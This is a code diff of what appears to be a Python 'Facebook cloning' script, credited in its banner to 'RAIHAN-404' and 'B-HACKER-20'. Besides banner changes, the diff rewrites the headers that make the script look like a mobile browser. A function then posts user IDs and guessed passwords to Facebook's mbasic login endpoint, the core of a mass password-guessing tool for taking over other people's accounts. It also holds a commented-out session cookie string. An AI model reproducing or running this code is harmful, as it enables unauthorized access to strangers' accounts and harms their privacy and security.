@@ -81,21 +81,23 @@ def __init__(self):
         self.loop = 0
         
 logo = ("""\033[1;90m
-                      💫    Assalamualaikum  💫
-💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥💥
+             💫    Assalamualaikum    💫
 
-.#####....####...######..##..##...####...##..##.
-.##..##..##..##....##....##..##..##..##..###.##.
-.#####...######....##....######..######..##.###.
-.##..##..##..##....##....##..##..##..##..##..##.
-.##..##..##..##..######..##..##..##..##..##..##.
-................................................
 
+██████╗  █████╗ ██╗██╗  ██╗ █████╗ ███╗   ██╗
+██╔══██╗██╔══██╗██║██║  ██║██╔══██╗████╗  ██║
+██████╔╝███████║██║███████║███████║██╔██╗ ██║
+██╔══██╗██╔══██║██║██╔══██║██╔══██║██║╚██╗██║
+██║  ██║██║  ██║██║██║  ██║██║  ██║██║ ╚████║
+╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
+                                             
+🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀
                                             🦜                                
-                               🥀    B-HACKER-20 💐(⁠*⁠_⁠*⁠)
+                               💥     B-HACKER-20     💥
+                               
 [1;92m\033[1;90m########################################\033[1;92m[1;92m
 [1;92m\033[1;91m[>] [1;96mDEVOLPER\033[1;92m----\033[1;96mRAIHAN-404 [1;92m        
-[1;92m\033[1;91m[>] [1;92mFACEBOOK\033[1;96m----\033[1;92m/HRIDOY CHOWDURY RAIHAN [1;92m     
+[1;92m\033[1;91m[>] [1;92mFACEBOOK\033[1;96m----\033[1;92m/HRIDOY-CHOWDURY-RAIHAN [1;92m     
 [1;92m\033[1;91m[>] [1;93mGITHUB\033[1;92m----\033[1;93mRAIHAN-404[1;92m         
 [1;92m\033[1;91m[>] [1;95mTOOLS\033[1;96m----\033[1;95mFACEBOOK CLONING[1;92m  
 [1;92m\033[1;90m########################################\033[1;92m
@@ -162,22 +164,17 @@ def RAIHAN(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             #_____Mathoid______#
-            authority': 'mbasic.facebook.com',
-     "method": 'GET',
-    "scheme": 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en-IN;q=0.9,en-AI;q=0.8,en;q=0.7,hi-IN;q=0.6,hi;q=0.5',
-    # 'cookie': 'datr=03hzZI5sJ_DmuwTJ7bYDfxO2; sb=03hzZBWbSS2vMx44HGmCVsKU; m_pixel_ratio=2; locale=en_US; vpd=v1%3B668x360x2; wl_cbv=v2%3Bclient_version%3A2259%3Btimestamp%3A1685289280; wd=360x668; fr=0STYgJFq7DDqmG07I.AWVLt3zMSYYgoN1k5O9m0kfWJQs.Bkc3jT.h2.AAA.0.0.Bkc3lK.AWVqCIGJbgo',
-    'referer': 'https://p.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'cache-control': 'max-age=0',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
             lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
